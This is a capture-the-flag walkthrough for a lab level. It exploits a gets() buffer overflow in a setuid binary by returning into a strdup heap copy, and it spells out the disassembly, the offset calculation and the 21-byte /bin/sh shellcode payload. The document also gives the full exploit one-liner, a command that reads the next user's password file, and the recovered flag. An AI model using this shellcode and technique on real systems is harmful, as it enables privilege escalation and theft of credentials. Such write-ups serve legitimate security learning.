# Level 2


<br>

### >> [Flag file](./flag) <<

<br>

### >> [Source file](./source.c) <<

<br>


## TL;DR:

```bash
echo -e '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x08\xa0\x04\x08' > /tmp/a && cat /tmp/a - | ./level2
```

And inside the program:
```bash
cat /home/user/level3/.pass
```

<br>


## Explanation:


#### Step 1:

- What's in the home directory:
```bash
ls -la
```

> ```
>total 17
>dr-xr-x---+ 1 level2 level2   80 Mar  6  2016 .
>dr-x--x--x  1 root   root    340 Sep 23  2015 ..
>-rw-r--r--  1 level2 level2  220 Apr  3  2012 .bash_logout
>-rw-r--r--  1 level2 level2 3530 Sep 23  2015 .bashrc
>-rwsr-s---+ 1 level3 users  5403 Mar  6  2016 level2
>-rw-r--r--+ 1 level2 level2   65 Sep 23  2015 .pass
>-rw-r--r--  1 level2 level2  675 Apr  3  2012 .profile
> ```


#### Step 2:

- Let's see what functions are in the `level2` binary:
```bash
gdb -q ./level2
info function
```

> ```asm
> All defined functions:
> 
> Non-debugging symbols:
> 0x08048358  _init
> 0x080483a0  printf
> 0x080483a0  printf@plt
> 0x080483b0  fflush
> 0x080483b0  fflush@plt
> 0x080483c0  gets
> 0x080483c0  gets@plt
> 0x080483d0  _exit
> 0x080483d0  _exit@plt
> 0x080483e0  strdup
> 0x080483e0  strdup@plt
> 0x080483f0  puts
> 0x080483f0  puts@plt
> 0x08048400  __gmon_start__
> 0x08048400  __gmon_start__@plt
> 0x08048410  __libc_start_main
> 0x08048410  __libc_start_main@plt
> 0x08048420  _start
> 0x08048450  __do_global_dtors_aux
> 0x080484b0  frame_dummy
> 0x080484d4  p
> 0x0804853f  main
> 0x08048550  __libc_csu_init
> 0x080485c0  __libc_csu_fini
> 0x080485c2  __i686.get_pc_thunk.bx
> 0x080485d0  __do_global_ctors_aux
> 0x080485fc  _fini
> ```
> We have 2 functions:
> - p
> - main

#### Step 3:


- Let's disassemble those functions:

```bash
disassemble p
disassemble main
```

>```asm
> Dump of assembler code for function p:
>    0x080484d4 <+0>:   push   %ebp
>    0x080484d5 <+1>:   mov    %esp,%ebp
>    0x080484d7 <+3>:   sub    $0x68,%esp
>    0x080484da <+6>:   mov    0x8049860,%eax
>    0x080484df <+11>:  mov    %eax,(%esp)
>    0x080484e2 <+14>:  call   0x80483b0 <fflush@plt>
>    0x080484e7 <+19>:  lea    -0x4c(%ebp),%eax
>    0x080484ea <+22>:  mov    %eax,(%esp)
>    0x080484ed <+25>:  call   0x80483c0 <gets@plt>
>    0x080484f2 <+30>:  mov    0x4(%ebp),%eax
>    0x080484f5 <+33>:  mov    %eax,-0xc(%ebp)
>    0x080484f8 <+36>:  mov    -0xc(%ebp),%eax
>    0x080484fb <+39>:  and    $0xb0000000,%eax
>    0x08048500 <+44>:  cmp    $0xb0000000,%eax
>    0x08048505 <+49>:  jne    0x8048527 <p+83>
>    0x08048507 <+51>:  mov    $0x8048620,%eax
>    0x0804850c <+56>:  mov    -0xc(%ebp),%edx
>    0x0804850f <+59>:  mov    %edx,0x4(%esp)
>    0x08048513 <+63>:  mov    %eax,(%esp)
>    0x08048516 <+66>:  call   0x80483a0 <printf@plt>
>    0x0804851b <+71>:  movl   $0x1,(%esp)
>    0x08048522 <+78>:  call   0x80483d0 <_exit@plt>
>    0x08048527 <+83>:  lea    -0x4c(%ebp),%eax
>    0x0804852a <+86>:  mov    %eax,(%esp)
>    0x0804852d <+89>:  call   0x80483f0 <puts@plt>
>    0x08048532 <+94>:  lea    -0x4c(%ebp),%eax
>    0x08048535 <+97>:  mov    %eax,(%esp)
>    0x08048538 <+100>: call   0x80483e0 <strdup@plt>
>    0x0804853d <+105>: leave  
>    0x0804853e <+106>: ret    
> ```
>
>  Here we can see the function `strdup` who duplicate the `gets` value and store it on the heap. So if we inject some shell command to `gets` and overflow his buffer to change the return address to the `strdup` value we should be able to exec our malicious shell code.
>
> ```
> Dump of assembler code for function main:
>    0x0804853f <+0>:  push   %ebp
>    0x08048540 <+1>:  mov    %esp,%ebp
>    0x08048542 <+3>:  and    $0xfffffff0,%esp
>    0x08048545 <+6>:  call   0x80484d4 <p>
>    0x0804854a <+11>: leave  
>    0x0804854b <+12>: ret    
> End of assembler dump.
> ```
> Here the only purpose of the `main` function is to call the `p` function.
>


#### Step 4:

- calculate the offset to overflow the buffer and overwrite the return address with the address of `strdup` value with the same method as level1. This give us a `80` bytes offset.

And to have the address of `strdup` value we can use `gdb` to find it:
```bash
gdb -q level2
b strdup
run < .bashrc
finish
x $eax
```
that display `0x0804a008` as the address of `strdup` value.

#### Step 5:

- Now that we have the offset, we have to create a shellcode to execute `/bin/sh` on 21 bytes.

```
\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```

Add to this code 59 characters to make it 80 bytes long. and add the address of `strdup` value to overwrite the return address. The final payload will look like this:

```bash
echo -e '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x08\xa0\x04\x08' > /tmp/a
```

and then we can use `cat` to send the payload to the `level2` binary:

```bash
cat /tmp/a - | ./level2
```

And inside the program:
```bash
cat /home/user/level3/.pass #this will be run by the /bin/sh command
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

<br>

[[<<]](/level1/walkthrough.md) &nbsp; [[Back to main page]](/Readme.md) &nbsp; [[>>]](/level3/walkthrough.md)
